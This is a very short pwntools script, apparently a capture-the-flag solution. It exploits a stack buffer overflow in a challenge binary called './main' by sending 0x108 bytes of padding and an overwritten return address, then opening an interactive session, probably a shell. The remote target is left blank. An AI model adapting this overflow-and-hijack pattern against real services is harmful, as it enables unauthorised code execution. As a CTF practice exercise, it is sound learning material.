from pwn import * 

p=remote("")   #for remote
p=process("./main")    # to test it locally with your own flag 

p.sendline(b"a"*0x108+p64(0x40121b))
p.interactive()   # dont forget about this one !!!!!

